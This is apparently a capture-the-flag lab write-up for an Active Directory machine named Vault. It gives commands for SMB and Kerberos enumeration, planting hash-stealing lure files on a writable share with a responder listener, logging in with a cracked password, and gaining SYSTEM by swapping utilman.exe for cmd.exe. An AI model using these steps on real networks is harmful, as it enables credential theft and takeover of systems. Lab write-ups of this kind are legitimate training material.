#Pwned #AD #Phishing #SeRestorePrivilege
```IP
192.168.155.172
```
# Enumeration
## Nmap
As always I start with a nmap port scan:
```bash
sudo nmap -sCV 192.168.155.172 -vvv -p- -oN enum/full
```
Output:
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-01-30 19:41:01Z)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 125
464/tcp   open  kpasswd5?     syn-ack ttl 125
593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 125
3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing 
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC        
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC              
49708/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

## SMB
Everytime I see SMB service up, I inmediately scan its shares with nxc:

```
nxc smb 192.168.155.172 -u 'guest' -p '' --shares
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130205945.png?raw=true)

We have write access over DocumentsShare share. Maybe we can use the impacket-smbexec package to try to upload a reverse shell:

```
impacket-smbexec guest:''@vault.offsec
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130210315.png?raw=true)

It does not seem possible. Also, the directory is empty:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130210139.png?raw=true)

## Kerberos

If we check for possible users by bruteforcing kerberos we get only administrator and guest users:
```
/home/kali/Documents/tools/kerbrute userenum --dc 192.168.155.172 -d vault.offsec /usr/share/SecLists-master/Usernames/cirt-default-usernames.txt
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130210917.png?raw=true)

## Back to SMB

Another way we can try to get some usernames is by bruteforcing RID values. This can be done with nxc too:

```
netexec smb 192.168.155.172 -u 'guest' -p '' --rid-brute 3000
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130211704.png?raw=true)

And as we can see, we have `anirudh` username!

## UDP scan
Maybe some UDP port enumeration will help us to advance:

```
sudo nmap -sU vault.offsec -vvv --top-ports=100 --min-rate=5000 -oN enum/udp
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130212410.png?raw=true)

The most we can do with ntp service is to check the server time stamp:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130212611.png?raw=true)


# Exploitation

We can upload to the DocumentsShare share a phishing attack in order to retrieve NTLM hashes. For this purpose we will use a tool called hashgrab.py, which automatically creates some malicious files which we will upload to smb. We will also abilitate responder in our local machine to catch the hash:
```
python hashgrab.py 192.168.45.157 hash
```

```
sudo responder -I tun0 -w
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130221939.png?raw=true)

Indeed we get the following hash:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130221953.png?raw=true)

Let's try to crack it with john:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130222131.png?raw=true)

```
evil-winrm -i vault.offsec -u 'anirudh' -p 'SecureHM'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130222250.png?raw=true)

# PrivEsc

## Manual
We can start enumerating the user by checking its privileges:
```
whoami /priv
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130223435.png?raw=true)

In turns out it has two potential PE vectors, one of them being SeRestorePrivilege. One way to exploit this privilege is to change the utilman executable for a cmd (since we have permissions over system32 files) and then trigger it via RDP:
```
mv c:\windows\system32\utilman.exe c:\windows\system32\utilman-OLD.exe
```
```
mv c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130223447.png?raw=true)

```
rdesktop -u anirudh -p SecureHM -v 192.168.155.172
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130223457.png?raw=true)

Once here, we need to type an incorrect password in order to access this unlock menu. If we then click on the `Ease of access` menu, we will execute cmd.exe instead of utilman.exe as shown below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130224314.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250130224154.png?raw=true)

Pwned!

